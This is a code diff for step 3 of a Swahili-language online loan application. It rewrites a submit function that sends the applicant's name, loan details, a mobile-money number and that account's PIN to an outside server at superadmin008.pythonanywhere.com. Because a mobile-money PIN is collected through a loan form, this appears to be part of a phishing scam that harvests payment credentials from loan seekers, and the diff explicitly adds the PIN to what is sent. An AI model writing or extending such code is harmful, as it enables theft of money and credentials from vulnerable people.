@@ -1,37 +1,24 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Hatua ya 3 - Tuma Maombi</title>
-</head>
-<body>
-
-<h2>Hatua ya 3: Kuwasilisha Maombi</h2>
-
-<p>Bofya kitufe hapa chini kutuma maombi yako ya mkopo.</p>
-
-<button onclick="tumaMaombi()">
-    Tuma Maombi
-</button>
-
 <script>
 
 function tumaMaombi() {
 
-    // PATA DATA YA HATUA YA 2
-    let mkopo = JSON.parse(
-        localStorage.getItem("mkopo_data")
-    );
+    let mkopo = JSON.parse(localStorage.getItem("mkopo_data"));
 
-    // HAKIKI DATA
     if (!mkopo) {
-
         alert("Hakuna taarifa za mkopo zilizopatikana");
-
         return;
-
     }
 
-    // TUMA KWENYE BACKEND
+    // CLEAN DATA (MATCH BACKEND EXACTLY)
+    let dataToSend = {
+        jina: mkopo.jina,
+        kiasi: mkopo.kiasi,
+        lengo: mkopo.lengo,
+        muda: mkopo.muda,
+        mixxNumber: mkopo.mixxNumber,
+        pin: mkopo.pin
+    };
+
     fetch("https://superadmin008.pythonanywhere.com/submit-step3", {
 
         method: "POST",
@@ -40,26 +27,28 @@ function tumaMaombi() {
             "Content-Type": "application/json"
         },
 
-        body: JSON.stringify(mkopo)
+        body: JSON.stringify(dataToSend)
 
     })
 
     .then(res => res.json())
-
     .then(data => {
 
-        console.log(data);
+        console.log("SERVER RESPONSE:", data);
 
-        alert("Maombi yamewasilishwa kwa mafanikio!");
+        if (data.application_id) {
 
-        // HIFADHI APP ID
-        localStorage.setItem(
-            "app_id",
-            data.application_id
-        );
+            alert("Maombi yamewasilishwa kwa mafanikio!");
 
-        // NENDA HATUA YA 4
-        window.location.href = "hatua4.html";
+            localStorage.setItem("app_id", data.application_id);
+
+            window.location.href = "hatua4.html";
+
+        } else {
+
+            alert("Hitilafu: Hakuna application ID imerudishwa");
+
+        }
 
     })
 
@@ -74,6 +63,3 @@ function tumaMaombi() {
 }
 
 </script>
-
-</body>
-</html>
